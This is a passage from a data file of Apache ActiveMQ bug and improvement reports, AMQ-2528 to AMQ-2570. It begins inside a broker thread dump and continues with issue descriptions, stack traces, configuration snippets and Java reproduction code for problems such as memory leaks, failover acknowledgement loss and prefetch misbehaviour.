org.apache.activemq.command.ActiveMQMessage.copy (ActiveMQMessage.java:64)  [5] org.apache.activemq.command.ActiveMQTextMessage.copy (ActiveMQTextMessage.java:57)  [6] org.apache.activemq.command.ActiveMQTextMessage.copy (ActiveMQTextMessage.java:52)  [7] org.apache.activemq.broker.region.RegionBroker.sendToDeadLetterQueue (RegionBroker.java:710)  [8] org.apache.activemq.broker.region.PrefetchSubscription.sendToDLQ (PrefetchSubscription.java:462)  [9] org.apache.activemq.broker.region.PrefetchSubscription.acknowledge (PrefetchSubscription.java:365)  [10] org.apache.activemq.broker.region.AbstractRegion.acknowledge (AbstractRegion.java:369)  [11] org.apache.activemq.broker.region.RegionBroker.acknowledge (RegionBroker.java:470)  [12] org.apache.activemq.broker.TransactionBroker.acknowledge (TransactionBroker.java:195)  [13] org.apache.activemq.broker.BrokerFilter.acknowledge (BrokerFilter.java:74)  [14] org.apache.activemq.broker.BrokerFilter.acknowledge (BrokerFilter.java:74)  [15] org.apache.activemq.broker.MutableBrokerFilter.acknowledge (MutableBrokerFilter.java:85)  [16] org.apache.activemq.broker.TransportConnection.processMessageAck (TransportConnection.java:466)  [17] org.apache.activemq.command.MessageAck.visit (MessageAck.java:205)  [18] org.apache.activemq.broker.TransportConnection.service (TransportConnection.java:309)  [19] org.apache.activemq.broker.TransportConnection$1.onCommand (TransportConnection.java:179)  [20] org.apache.activemq.transport.TransportFilter.onCommand (TransportFilter.java:68)  [21] org.apache.activemq.transport.WireFormatNegotiator.onCommand (WireFormatNegotiator.java:113)  [22] org.apache.activemq.transport.InactivityMonitor.onCommand (InactivityMonitor.java:210)  [23] org.apache.activemq.transport.TransportSupport.doConsume (TransportSupport.java:84)  [24] org.apache.activemq.transport.tcp.TcpTransport.doRun (TcpTransport.java:203)  [25] org.apache.activemq.transport.tcp.TcpTransport.run (TcpTransport.java:185)  [26] java.lang.Thread.run (Thread.java:735)ActiveMQ Transport: tcp:///127.0.0.1:56733:  [1] java.util.HashMap.putAllImpl (HashMap.java:679)  [2] java.util.HashMap.<init> (HashMap.java:369)  [3] org.apache.activemq.command.Message.copy (Message.java:120)  [4] org.apache.activemq.command.ActiveMQMessage.copy (ActiveMQMessage.java:64)  [5] org.apache.activemq.command.ActiveMQTextMessage.copy (ActiveMQTextMessage.java:57)  [6] org.apache.activemq.command.ActiveMQTextMessage.copy (ActiveMQTextMessage.java:52)  [7] org.apache.activemq.broker.region.RegionBroker.sendToDeadLetterQueue (RegionBroker.java:710)  [8] org.apache.activemq.broker.region.PrefetchSubscription.sendToDLQ (PrefetchSubscription.java:462)  [9] org.apache.activemq.broker.region.PrefetchSubscription.acknowledge (PrefetchSubscription.java:365)  [10] org.apache.activemq.broker.region.AbstractRegion.acknowledge (AbstractRegion.java:369)  [11] org.apache.activemq.broker.region.RegionBroker.acknowledge (RegionBroker.java:470)  [12] org.apache.activemq.broker.TransactionBroker.acknowledge (TransactionBroker.java:195)  [13] org.apache.activemq.broker.BrokerFilter.acknowledge (BrokerFilter.java:74)  [14] org.apache.activemq.broker.BrokerFilter.acknowledge (BrokerFilter.java:74)  [15] org.apache.activemq.broker.MutableBrokerFilter.acknowledge (MutableBrokerFilter.java:85)  [16] org.apache.activemq.broker.TransportConnection.processMessageAck (TransportConnection.java:466)  [17] org.apache.activemq.command.MessageAck.visit (MessageAck.java:205)  [18] org.apache.activemq.broker.TransportConnection.service (TransportConnection.java:309)  [19] org.apache.activemq.broker.TransportConnection$1.onCommand (TransportConnection.java:179)  [20] org.apache.activemq.transport.TransportFilter.onCommand (TransportFilter.java:68)  [21] org.apache.activemq.transport.WireFormatNegotiator.onCommand (WireFormatNegotiator.java:113)  [22] org.apache.activemq.transport.InactivityMonitor.onCommand (InactivityMonitor.java:210)  [23] org.apache.activemq.transport.TransportSupport.doConsume (TransportSupport.java:84)  [24] org.apache.activemq.transport.tcp.TcpTransport.doRun (TcpTransport.java:203)  [25] org.apache.activemq.transport.tcp.TcpTransport.run (TcpTransport.java:185)  [26] java.lang.Thread.run (Thread.java:735)InactivityMonitor ReadCheck:  [1] java.lang.Object.wait (native method)  [2] java.lang.Object.wait (Object.java:196)  [3] java.util.Timer$TimerImpl.run (Timer.java:230)InactivityMonitor WriteCheck:  [1] java.lang.Object.wait (native method)  [2] java.lang.Object.wait (Object.java:196)  [3] java.util.Timer$TimerImpl.run (Timer.java:230)ActiveMQ Transport: tcp://localhost/127.0.0.1:61616:  [1] java.net.SocketInputStream.socketRead0 (native method)  [2] java.net.SocketInputStream.read (SocketInputStream.java:140)  [3] org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill (TcpBufferedInputStream.java:50)  [4] org.apache.activemq.transport.tcp.TcpBufferedInputStream.read (TcpBufferedInputStream.java:58)  [5] java.io.DataInputStream.readInt (DataInputStream.java:381)  [6] org.apache.activemq.openwire.OpenWireFormat.unmarshal (OpenWireFormat.java:272)  [7] org.apache.activemq.transport.tcp.TcpTransport.readCommand (TcpTransport.java:210)  [8] org.apache.activemq.transport.tcp.TcpTransport.doRun (TcpTransport.java:202)  [9] org.apache.activemq.transport.tcp.TcpTransport.run (TcpTransport.java:185)  [10] java.lang.Thread.run (Thread.java:735)ActiveMQ Transport: tcp:///127.0.0.1:56754:  [1] org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending (PrefetchSubscription.java:582)  [2] org.apache.activemq.broker.region.PrefetchSubscription.add (PrefetchSubscription.java:158)  [3] org.apache.activemq.broker.region.DurableTopicSubscription.add (DurableTopicSubscription.java:199)  [4] org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch (SimpleDispatchPolicy.java:49)  [5] org.apache.activemq.broker.region.Topic.dispatch (Topic.java:588)  [6] org.apache.activemq.broker.region.Topic.doMessageSend (Topic.java:442)  [7] org.apache.activemq.broker.region.Topic.send (Topic.java:376)  [8] org.apache.activemq.broker.region.AbstractRegion.send (AbstractRegion.java:354)  [9] org.apache.activemq.broker.region.RegionBroker.send (RegionBroker.java:445)  [10] org.apache.activemq.broker.TransactionBroker.send (TransactionBroker.java:227)  [11] org.apache.activemq.broker.BrokerFilter.send (BrokerFilter.java:126)  [12] org.apache.activemq.broker.CompositeDestinationBroker.send (CompositeDestinationBroker.java:95)  [13] org.apache.activemq.broker.MutableBrokerFilter.send (MutableBrokerFilter.java:133)  [14] org.apache.activemq.broker.TransportConnection.processMessage (TransportConnection.java:459)  [15] org.apache.activemq.command.ActiveMQMessage.visit (ActiveMQMessage.java:631)  [16] org.apache.activemq.broker.TransportConnection.service (TransportConnection.java:309)  [17] org.apache.activemq.broker.TransportConnection$1.onCommand (TransportConnection.java:179)  [18] org.apache.activemq.transport.TransportFilter.onCommand (TransportFilter.java:68)  [19] org.apache.activemq.transport.WireFormatNegotiator.onCommand (WireFormatNegotiator.java:113)  [20] org.apache.activemq.transport.InactivityMonitor.onCommand (InactivityMonitor.java:210)  [21] org.apache.activemq.transport.TransportSupport.doConsume (TransportSupport.java:84)  [22] org.apache.activemq.transport.tcp.TcpTransport.doRun (TcpTransport.java:203)  [23] org.apache.activemq.transport.tcp.TcpTransport.run (TcpTransport.java:185)  [24] java.lang.Thread.run (Thread.java:735)QueueThread:queue://ActiveMQ.DLQ:  [1] sun.misc.Unsafe.park (native method)  [2] java.util.concurrent.locks.LockSupport.park (LockSupport.java:173)  [3] java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await (AbstractQueuedSynchronizer.java:1,936)  [4] java.util.concurrent.LinkedBlockingQueue.take (LinkedBlockingQueue.java:369)  [5] java.util.concurrent.ThreadPoolExecutor.getTask (ThreadPoolExecutor.java:957)  [6] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:917)  [7] java.lang.Thread.run (Thread.java:735)ActiveMQ Transport Stopper: /127.0.0.1:56733:  [1] sun.misc.Unsafe.park (native method)  [2] java.util.concurrent.locks.LockSupport.park (LockSupport.java:173)  [3] java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt (AbstractQueuedSynchronizer.java:758)  [4] java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued (AbstractQueuedSynchronizer.java:789)  [5] java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire (AbstractQueuedSynchronizer.java:1,125)  [6] java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock (ReentrantReadWriteLock.java:818)  [7] org.apache.activemq.broker.TransportConnection$3.run (TransportConnection.java:931)InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@4700470:  [1] sun.misc.Unsafe.park (native method)  [2] java.util.concurrent.locks.LockSupport.parkNanos (LockSupport.java:213)  [3] java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill (SynchronousQueue.java:435)  [4] java.util.concurrent.SynchronousQueue$TransferStack.transfer (SynchronousQueue.java:334)  [5] java.util.concurrent.SynchronousQueue.poll (SynchronousQueue.java:885)  [6] java.util.concurrent.ThreadPoolExecutor.getTask (ThreadPoolExecutor.java:955)  [7] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:917)  [8] java.lang.Thread.run (Thread.java:735)
issueID:AMQ-2528
type:Bug
changed files:
texts:org.apache.activemq.broker.region.Queue#removeMatchingMessages(String selector) does not allow empty string as a selector, but empty string is a valid JMS message selector.
According to the JMS specification, an "empty string" message selector indicates no message selector (i.e., all messages should be selected):"A message selector is a String whose syntax is based on a subset of the SQL92 conditional expression syntax. If the value of a message selector is an empty string, the value is treated as a null and indicates that there is no message selector for the message consumer."However, if org.apache.activemq.broker.region.Queue#removeMatchingMessages(String selector)  with selector = "", the following stacktrace is generated:javax.jms.InvalidSelectorException:  at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:72) at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:46) at org.apache.activemq.broker.region.Queue.createSelectorFilter(Queue.java:1200) at org.apache.activemq.broker.region.Queue.removeMatchingMessages(Queue.java:908) at org.apache.activemq.broker.region.Queue.removeMatchingMessages(Queue.java:898) at com.invoqsystems.foundation.utility.AMQUtility.deleteMessages(AMQUtility.java:192) at com.invoqsystems.foundation.utility.AMQUtilityTest.testDeleteMessages(AMQUtilityTest.java:187) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.junit.internal.runners.TestMethodRunner.executeMethodBody(TestMethodRunner.java:99) at org.junit.internal.runners.TestMethodRunner.runUnprotected(TestMethodRunner.java:81) at org.junit.internal.runners.BeforeAndAfterRunner.runProtected(BeforeAndAfterRunner.java:34) at org.junit.internal.runners.TestMethodRunner.runMethod(TestMethodRunner.java:75) at org.junit.internal.runners.TestMethodRunner.run(TestMethodRunner.java:45) at org.junit.internal.runners.TestClassMethodsRunner.invokeTestMethod(TestClassMethodsRunner.java:71) at org.junit.internal.runners.TestClassMethodsRunner.run(TestClassMethodsRunner.java:35) at org.junit.internal.runners.TestClassRunner$1.runUnprotected(TestClassRunner.java:42) at org.junit.internal.runners.BeforeAndAfterRunner.runProtected(BeforeAndAfterRunner.java:34) at org.junit.internal.runners.TestClassRunner.run(TestClassRunner.java:52) at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:38) at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:460) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:673) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:386) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:196)Caused by: org.apache.activemq.selector.ParseException: Parse error at line 0, column 0.  Encountered: <EOF> at org.apache.activemq.selector.SelectorParser.generateParseException(SelectorParser.java:1196) at org.apache.activemq.selector.SelectorParser.jj_consume_token(SelectorParser.java:1148) at org.apache.activemq.selector.SelectorParser.unaryExpr(SelectorParser.java:453) at org.apache.activemq.selector.SelectorParser.multExpr(SelectorParser.java:375) at org.apache.activemq.selector.SelectorParser.addExpression(SelectorParser.java:344) at org.apache.activemq.selector.SelectorParser.comparisonExpression(SelectorParser.java:196) at org.apache.activemq.selector.SelectorParser.equalityExpression(SelectorParser.java:141) at org.apache.activemq.selector.SelectorParser.andExpression(SelectorParser.java:120) at org.apache.activemq.selector.SelectorParser.orExpression(SelectorParser.java:99) at org.apache.activemq.selector.SelectorParser.JmsSelector(SelectorParser.java:91) at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:69) ... 26 more
issueID:AMQ-2529
type:Bug
changed files:
texts:Browsing Queues over network can cause a message delivered twice
When you browse a queue over the network, messages are not removed from the local broker, so they can be later consumer from both local and remote broker
issueID:AMQ-2530
type:Bug
changed files:
texts:memory leak in ConduitBridge (subscriptionMapByRemoteId)
I believe there is a memory leak in ConduitBridge - looks like DemandSubscriptions are not removed from subscriptionMapByRemoteId when remote RemoveInfo is received.removeDemandSubscription normally removes subscription from subscriptionMapByRemoteId in DemanForwardingBridgeSupport, but method is overriden in ConduitBridge and only removes subscription from subscriptionMapByLocalId.Leak becomes more significant when consumers are connecting very often (i.e. few connections per second), and bridge connection is stable (lasts for couple of days without reconnecting). MessageConsumer"s are not pooled and subscriptions are created and removed often (and forwarded via bridge).
issueID:AMQ-2533
type:Bug
changed files:AdvisoryBroker.java
texts:OutOfMemory provoked by Advisory messages
Hello,We are in an environment where we have 1 Broker and 6 clients listener to one Topic.We enabled advisory messages through:<policyEntry topic=">" memoryLimit="5mb" producerFlowControl="true"  advisoryWhenFull="true" advisoryForSlowConsumers="true"                      sendAdvisoryIfNoConsumers="true">And sendFailIfNoSpace:<systemUsage>            <systemUsage sendFailIfNoSpace="true">                <memoryUsage>                    <memoryUsage limit="50 mb"/>                </memoryUsage>                <storeUsage>                    <storeUsage limit="1 gb" name="foo" store="#store"/>                </storeUsage>                <tempUsage>                    <tempUsage limit="100 mb"/>                </tempUsage>            </systemUsage>        </systemUsage>We also have a monitoring process that listens to advisory messages related to the concerned TOPIC.After some run, we end up with OutOfMemory.OutOfMemory analysis shows: 3372 instances of org.apache.activemq.command.ActiveMQTopic occupying 23,7%Names of Topic contain ActiveMQ.Advisory.FULL.Topic: ActiveMQ.Advisory.FULL.Topic.ActiveMQ.Advisory.FULL.Topic.ActiveMQ.Advisory.FULL.....ActiveMQ.Advisory.Producer.Topic.OFBTopic1069 instances of org.apache.activemq.thread.DedicatedTaskRunner$1 holding 12% through the names of the thread that are soooooo long.Debuging ActiveMQ, I noticed that AMQ didn"t check when sending advisory messages that advisory concerns an advisory.Example, suppose you set a listener for advisory message ActiveMQ.Advisory.FULL.Topic.OFBTopic and this listener becomes slow for a reason, then AMQ will send an advisory on this advisory provoking more and more traffic on the broker only for this advisory.I attached a Stack Trace showing that an advisory will be sent for the advisory.I will be checking to see if this issue also exists on 5.3.0.Thanks in advance.Philippe.http://www.ubik-ingenierie.com
issueID:AMQ-2535
type:Improvement
changed files:
texts:Jetty SSL configuration
Upgrade Jetty to version 7 and provide an easy optional configuration for ssl.
issueID:AMQ-2536
type:Bug
changed files:JAXPXPathEvaluator.java
XalanXPathEvaluator.java
texts:XPath selectors return false if xalan is not on the classpath
When xalan.jar is not on the classpath, then org.apache.activemq.filter.XalanXPathEvaluator in evaluate() method tries to load org.apache.xpath.CachedXPathAPI, throws NoClassDefFoundError, that is catched as Throwable and false is returned instead of an error.No clue is given to the client, that it lacks a jar on the classpath and the impression is, that XPath selectors doesn"t work and return false whatever the message is.I believe if we catch Exception instead of Throwable, then the problem would be fixed.
issueID:AMQ-2539
type:Bug
changed files:
texts:Creating temporary destinations omits security checkings
Session.createTemporaryTopic() for example will successfully create a temporary topic even though it is not allowed by security policies.
issueID:AMQ-2540
type:Bug
changed files:
texts:Duplicate suppression lack of recovery with JDBCStore can result in "hung" queue afer failover of outstanding send or transaction.
during failover, when a commit or send reply is lost, such that the broker has completed the operation but the client does not see the reply, the operation and context will be replayed. This results in duplicate messages that should be suppressed. The AMQ reference store does this correctly but the audit check in the JDBCMessageStore does not do recovery so it is unaware of past events. Adding some replay capability to the audit resolves this as it can then suppress duplicated.The audit depth should limit the replay depth.<jdbcPersistenceAdapter dataSource="#...." maxProducersToAudit="10000"/>
issueID:AMQ-2547
type:Bug
changed files:
texts:ActiveMQ and Spring 3.0
Make ActiveMQ work correctly with Spring 3.0
issueID:AMQ-2548
type:Bug
changed files:
texts:Downloading Blob messages via FTP fails for files larger than 64KB
The following code will only download 64 KB of any uploaded file greater than 64 KB.The test file (ca. 15 MB) was completly  uploaded to the FTP-Server.    File file = new File(directoryName+fileName);        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(URI);    Connection connection = factory.createQueueConnection();     connection.start();        ActiveMQSession session = (ActiveMQSession) connection.createSession(                                false, Session.AUTO_ACKNOWLEDGE);    Destination destination = session.createQueue("MyQ");    MessageProducer producer = session.createProducer(destination);    MessageConsumer consumer = session.createConsumer(destination);    BlobMessage message = session.createBlobMessage(file);          producer.send(message);    System.out.println("Sent: " + message);        Thread.sleep(1000);          // check message sent    Message msg = consumer.receive();        BlobDownloadStrategy strategy = new FTPBlobDownloadStrategy();          InputStream input = strategy.getInputStream((ActiveMQBlobMessage)msg);    File f=new File(fileName);    OutputStream out=new FileOutputStream(f);    byte buf[]=new byte[1024];    int len;        while((len=input.read(buf))>0){      out.write(buf,0,len);    }    out.close();    input.close();     System.out.println("Received: " + message);    After examining org.apache.activemq.blob.FTPBlobDownloadStrategy it seemed suspicious that the FTPClient connection was destroyed before the input stream is processed.public InputStream getInputStream(ActiveMQBlobMessage message) throws IOException, JMSException {        URL url = message.getURL();                setUserInformation(url.getUserInfo());        String connectUrl = url.getHost();        int port = url.getPort() < 1 ? 21 : url.getPort();        FTPClient ftp = new FTPClient();        try {         ftp.connect(connectUrl, port);        } catch(ConnectException e) {         throw new JMSException("Problem connecting the FTP-server");        }                if(!ftp.login(ftpUser, ftpPass)) {         ftp.quit();            ftp.disconnect();            throw new JMSException("Cant Authentificate to FTP-Server");        }        String path = url.getPath();        String workingDir = path.substring(0, path.lastIndexOf("/"));        String file = path.substring(path.lastIndexOf("/")+1);                ftp.changeWorkingDirectory(workingDir);        ftp.setFileType(FTPClient.BINARY_FILE_TYPE);        InputStream input = ftp.retrieveFileStream(file);        ftp.quit(); // really?        ftp.disconnect(); // really?                return input;    }After commenting those two last ftp calls, files larger than 64 KB were downloaded properly, but this should of course not be the final solution. Any suggestions?Cheers, Toni
issueID:AMQ-2550
type:Bug
changed files:
texts:Unresolved constraint in bundle org.apache.activemq.activemq-core: package; (&(package=org.osgi.framework)(version>=1.4.0)(!(version>=1.5.0)))
The bundle org.apache.activemq.activemq-core - version 5.4-SNAPSHOT cannot be installed on Apache Felix Karaf 1.2 due to unresolve constraint :(&(package=org.osgi.framework)(version>=1.4.0)(!(version>=1.5.0)))Felix 2.0.1 exports this package version : karaf@root> packages:exports  0System Bundle (0): org.osgi.framework; version=1.5.0BE CAREFUL ABOUT PROJECT SYNCHRONIZATION WITH KARAF, SMX4 and CAMEL for OSGI STUFFS
issueID:AMQ-2553
type:Bug
changed files:
texts:Browsing DLQ over transacted session
When you browse DLQ over transacted session, a rollback is called when browser disconnects and can lead to messages to be sent to another DLQ (if their max redeliveries has been reached). The simple solution is to commit the session, just before destroying the consumer in those situations.
issueID:AMQ-2555
type:Improvement
changed files:
texts:A number of tests fail if the base directory contains whitespaces
In the activemq-core project these tests will fail if the base directory contains whitespace, this is sometimes the case on Windows. BrokerXmlConfigFromJNDITest StompSslAuthTest XBeanSecurityTest SimpleSecurityBrokerSystemTestRather than just failing the tests should state that the base directory should not contain spaces, this is due to the restrictions on characters that can be used in URIs, URLs, etc.I"ll attach a patch for this now.
issueID:AMQ-2556
type:Bug
changed files:TransactionContext.java
texts:Memory leaks with XA Transactions (case of read-only transactions)
Some transaction related information are not released in case of read-only transactions (where not messages have been consumed or produced) by broker and client, that causes an OutOfMemory after running some time.Fields that hold these "transaction related information" are (at least) : org.apache.activemq.state.ConnectionState.transactions org.apache.activemq.TransactionContext.ENDED_XA_TRANSACTION_CONTEXTSAfter serach, it seems that the case of read-only XA transactions (that terminates at prepare time) has been missed in some code like : org.apache.activemq.broker.TransportConnection that puts TransactionState in org.apache.activemq.state.ConnectionState.transactions at the beginning, release them at commit (or rollback) time but not at prepare time where result is XAResource.XA_RDONLY org.apache.activemq.TransactionContext that do the same mistake via ENDED_XA_TRANSACTION_CONTEXTS in prepare()_Note that the case of read-only transactions seems correctly done by org.apache.activemq.transaction.XATransaction (very interesting comment here http://fisheye6.atlassian.com/browse/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/transaction/XATransaction.java?r=809940#l175)_
issueID:AMQ-2560
type:Bug
changed files:FailoverTransport.java
ActiveMQMessageConsumer.java
PrefetchSubscription.java
texts:Failover reconnect with outstanding consumer transaction can result in javax.jms.JMSException: Unmatched acknowledege: MessageAck and lost ack
It is possible to loose an ack after failover if an outstanding consumer transaction (and ack) is in progress during failover. If due to ordering or timing, an unexpected message is replayed to the consumer on recovery it will delivered (and correctly not suppressed as a duplicate). This will be acked with the outstanding messages but the ack will result in an exception javax.jms.JMSException: Unmatched acknowledege: MessageAck... as the original message will not have been re-dispatched. Essentially the ack is lost at this stage.The message will stay dispatched/inflight til the consumer closes, at which point it can again be re-dispatched to another consumer. A broker restart will also see it re-dispatched. In the mean time, it can look orphaned for some time or will be visible in the jdbc store. It will also be visible via the inflight count on that consumer.Resolution:On a transport disconnect, a consumer should discard acked state along with delivered messages as the messages that are redelivered are not guaranteed to be the same. This was not being done for a transacted session. Replayed messages are more likely to be the same if the order of connection recovery is preserved, but this will not be sufficient. (the test case shows the problem because recovery order is dependent on hashmap order which is random when dealing with connection ids)This needs to be done for both consumers that use receive() or message listeners (that are handled through dispatch)
issueID:AMQ-2561
type:Bug
changed files:
texts:Subscriber receives messages that sent by itself even if noLocal is true.
1, use org.springframework.jms.connection.SingleConnectionFactory to wrap org.apache.activemq.spring.ActiveMQConnectionFactory so that we only use single connection.2, use org.springframework.jms.core.JmsTemplate to send a simple text message.3, use org.springframework.jms.listener.DefaultMessageListenerContainer to receive message, <bean id="defaultMessageListenerContainer" class="org.springframework.jms.listener.DefaultMessageListenerContainer">  <property name="connectionFactory" ref="connectionFactory"/>  <property name="sessionTransacted" value="true"/>  <property name="pubSubDomain" value="true"/>  <property name="pubSubNoLocal" value="true"/>  <property name="destination" ref="topicDestination"/>  <property name="subscriptionDurable" value="true"/>  <property name="durableSubscriptionName" value="bus.topic"/>  <property name="messageListener">   <bean class="com.sinosoft.activemq.listener.DefaultMessageListener"/>  </property> </bean>4, messageListener receive messages sent by itself.Also,to reproduce:package test;import javax.jms.Connection;import javax.jms.ConnectionFactory;import javax.jms.Message;import javax.jms.MessageListener;import javax.jms.MessageProducer;import javax.jms.Session;import javax.jms.TextMessage;import javax.jms.Topic;import javax.jms.TopicSubscriber;import org.apache.activemq.ActiveMQConnectionFactory;import org.apache.activemq.command.ActiveMQTopic;public final class Producer implements MessageListener{    private Producer() {    }    public static void main(String[] args) {        String url = "failover:(tcp://172.31.0.82:61610)";        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(url);        Topic destination = new ActiveMQTopic("bus.topic");        Connection connection = null;        try{         connection = connectionFactory.createConnection();         connection.setClientID("112234");                  Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);                  TopicSubscriber subscriber = session.createDurableSubscriber(destination, "topicUser2", null, true);         System.out.println(subscriber + " getNoLocal()= " + subscriber.getNoLocal());         Producer listener = new Producer();         subscriber.setMessageListener(listener);                  connection.start();                  MessageProducer producer = session.createProducer(destination);         TextMessage message = session.createTextMessage("THIS IS A TEST");         producer.send(message);         producer.close();         System.out.println("Send a message " + message);        }catch(Exception e){         e.printStackTrace();        }    } public void onMessage(Message msg){  System.out.println("Receive a message " + msg); }}
issueID:AMQ-2563
type:Bug
changed files:
texts:Memory Leak in DefaultJDBCAdapter
I was performing an endurance test on ActiveMQ 5.3.0.  My test consisted of a single queue with a number of producers and consumers.  The producers send very simple text messages and the consumers simply receive the message and do no other processing.  Using the OOTB configuration (which uses -Xmx512m) with JDBC persistence to an Oracle database, I found the system came to a halt at around 10.3 million messages.  Looking at the VM revealed a very full heap and tiny gains from garbage collection.  Restarting the broker allows the system to run again.To determine the cause of the exhausted heap, I took a series of heap dumps over time.  My examination of the heaps showed that the number of live instances of TreeMap$Entry and Long were increasing linearly with the number of messages.  The Longs were owned by the TreeMap$Entry objects.  The TreeMap$Entry objects could be tracked back to the TreeSet<Long> instance from the lastRecoveredMessageIds field in DefaultJDBCAdapter.The only method that uses lastRecoveredMessageIds is:public void doRecoverNextMessages(TransactionContext c, ActiveMQDestination destination, long nextSeq,            int maxReturned, JDBCMessageRecoveryListener listener) throws ExceptionAs the listener is called to recover a message, the id is added to this set.  The id is only removed from this set if it is encountered on future run of doRecoverNextMessages when it is added to the cleanupIds list.  The SQL that is executed at the beginning of the method filters messages based on having an id greater than nextSeq.  If nextSeq is always large enough, an id is never added to cleanupIds and consequently never removed from lastRecoveredMessageIds.I saw that the use of lastRecoveredMessageIds was introduced with AMQ-1918.  Also, AMQ-2436 synchronizes the TreeSet, but that should have no effect on this issue.Dejan mentioned some work done on JDBC persistence and a memory leak fix in association with AMQ-2519.  I have performed the same test on the latest snapshots of 5.3.1 and 5.4.  The same results were observed on those as well.  Also, work done for AMQ-2519 modified JDBCMessageStore, JDBCTopicMessageStore, and JDBCPersistenceAdapter.  I believe the issue is in DefaultJDBCAdapter.To reproduce: Start a broker using JDBC persistence (sample configuration file will be attached) Start a number of producers and consumers using the same queue on that broker (sample WAR file will be attached.  Modify WEB-INF/applicationContext.xml to set the queue name and broker URL.  The war file currently uses TestQueue and tcp://localhost:61616, respectively.) Wait for about 20,000 messages to be processed (you can use less; it just gets easier in the heap dumps to see after about 20,000 messages.  29 bytes are retained per message that is processed) Look at the old generation size after a full garbage collection over time.  It grows slowly. Obtain a heap dump.  The heap dump will show a number of retained instances of TreeMap$Entry and Long.  (sample heap dump will be attached)
issueID:AMQ-2564
type:Bug
changed files:
texts:Pure Master Slave broker hangs when storage limit is reached
The pure master slave broker hangs when the storage limit is reached and dequeueing messages from the queue is not possible.The behavior can be reproduced with a producer which sends messages to the master broker until the slave broker writes "INFO | Usage Manager Store is Full. Stopping producer (ID:karkand-51292-1263305705067-0:0:1:1) to prevent flooding queue://TestQueue. See http://activemq.apache.org/producer-flow-control.html for more info"this message to the console.To reproduce the store is full message on the slave broker maybe 2 - 3 attempts are necessary otherwisethe messages appears on the console of the master broker.Any attempts by a test consumer to dequeue messages fail, it just hangs.The following information gather with JMX might be interesting:MASTER: StorePercentUsage=99SLAVE:    StorePercentUsage=100The attributes for the Queue are identical on both brokers.
issueID:AMQ-2566
type:Bug
changed files:
texts:Rollback redelivery causes inflight count to get out of sync
A negative inflight count can result from rollback redelivery as each rollback decremented the inflight countWith a 0 maxRedeliveryAttempts policy, the poisonAck was incrementing inflight.poisinAck should manage the inflight as they are still present (inflight) in the consumer till they are acked via commit or a poisonAck.adding some asserts to the existing DeadLetterTest junit demonstrates the problem.
issueID:AMQ-2567
type:Bug
changed files:
texts:Zero Prefetch not working
I have problems using the zero prefetch. The consumer starts prefetching messages after some receives. Our use case is, that we have a large computation which is split into smaller sub jobs. These jobs are sent via ActiveMQ to some processing nodes on different machines. The duration of jobs differs very much (10s to some minutes). The jobs are sent by decreasing estimated computation time. If one of the consumers which receives a large job prefetches some other jobs, these will be processed later. In the meantime the remaining consumers are idle, and the total computation time is much longer than necessary.I have modified the existing ZeroPrefetchConsumerTest to test for the problem (I have removed the other test methods). Two consumers (C1  and C2) are instantiated. These messages are sent:1,2,3,4,5,6,7,8,9C1 reads 4 times, receives 1,2,3,4 -> this is correctnow C2 reads, it receives 8 not 5, which is the next message in the queue. The reason is, that C1 prefetched 5, 6, 7, that should not have happened.(sometimes C1 only prefetches 5,6)The problem can be seen in the JMX Console as well, after a while, the first consumer has more than one dispatched message and the queue has an InflightCount of 3, although there are only two consumers!The last version that we used was 4.1.1, that worked.
issueID:AMQ-2568
type:Bug
changed files:ThreadExplorer.java
EmbeddedActiveMQ.java
texts:Embedded broker not shutting down cleanly because of lingering threads
See also this thread: http://mail-archives.apache.org/mod_mbox/activemq-users/201001.mbox/%3C4E50CAAD-0600-46FB-B5D0-B623C21A362D@gmail.com%3ESee also this bug: http://issues.apache.org/activemq/browse/AMQ-1214========================we have a 5.3.0 embedded broker that refuses to shutdown cleanly because of lingering threads. A long time (dozens of seconds) after broker stop() is called,  these threads are still active: &#91;ActiveMQ Scheduler&#93; (Daemon) Group: main &#91;Timer-0&#93; (Daemon) Group: mainWe discovered that &#91;ActiveMQ Scheduler&#93; can be closed adding this snippet to our code:Scheduler scheduler = Scheduler.getInstance();scheduler.shutdown();After doing this the other lingering thread &#8211; "&#91;Timer-0&#93;" &#8211; did not go away, but at least we discovered that this timer is JMX related: if we disable JMX connector the timer disappear.
issueID:AMQ-2569
type:Improvement
changed files:
texts:activemq-core/META-INF/spring.schema should include the released activemq-core.xsd
We should include the released activemq-core version in that spring.schema file to avoid the spring loading the schema file from internet when user specify the schemaLocation like this "http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core-5.3.0.xsd"
issueID:AMQ-2570
type:New Feature
changed files:
texts:ActiveMQ Karaf support
